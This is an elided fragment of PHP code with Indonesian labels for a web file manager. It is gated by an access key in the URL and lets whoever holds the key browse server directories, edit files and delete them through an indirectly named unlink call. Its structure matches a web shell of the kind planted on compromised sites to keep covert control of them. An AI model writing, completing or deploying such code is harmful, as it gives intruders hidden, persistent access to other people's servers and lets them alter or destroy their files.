...
if (isset($_GET['d'])) {
    ...
    if (is_file($t)) {
        $unlinkf($t);
        header("Location: ?p=" . urlencode($p) . "&k=" . $access_key);
        exit;
    }
}
?>
...
<h3>📁 Direktori: <?= e($p) ?></h3>
<form method="get">
    <input type="hidden" name="k" value="<?= e($access_key) ?>">
...
foreach ($items as $i) {
    ...
    echo "<tr>";
    echo "<td>" . ($isDir ? "<a href='?p=" . urlencode($fp) . "&k=$access_key'>📁 $i</a>" : "📄 $i") . "</td>";
    ...
    echo "<td>";
    if (!$isDir) {
        echo "<a href='?p=" . urlencode($p) . "&e=" . urlencode($i) . "&k=$access_key'>✏️</a> ";
        echo "<a href='?p=" . urlencode($p) . "&d=" . urlencode($i) . "&k=$access_key' onclick='return confirm(\"Hapus?\")'>🗑️</a> ";
